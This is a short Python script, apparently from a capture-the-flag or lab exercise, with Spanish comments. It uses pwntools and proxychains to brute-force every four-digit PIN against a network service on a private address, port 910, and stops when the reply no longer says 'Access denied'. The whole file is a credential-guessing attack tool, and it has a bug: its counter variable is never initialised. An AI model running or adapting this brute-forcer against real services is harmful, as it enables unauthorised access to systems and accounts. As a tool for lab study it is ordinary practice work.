#!/usr/bin/python3

from pwn import *
import time

def tryPin():
    # create a dictionary > #in bash -> for i in {0000..9999}; do echo $i; done > pins.txt
    pins = open("pins.txt", "r")

    p1 = log.progress("Fuerza Bruta")
    p1.status("Comenzando fuerza bruta")
    time.sleep(2)

    for pin in pins:
        p1.status("probando con el pin %s [%s/10000]" % (pin.strip('\n'), str(counter)))
        
        with process(['proxychains', 'python', '-c', f'''
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('10.10.14.2', 910))

data = s.recv(4096)

s.send({pin.encode()!r})

data = s.recv(1024)

if b"Access denied" not in data:
    print("El pin correcto es {pin.strip('\\n')!s}")
    exit(0)
'''], shell=False) as p:
            p.wait_for_close()
            
        counter += 1

if __name__ == '__main__':
    tryPin()

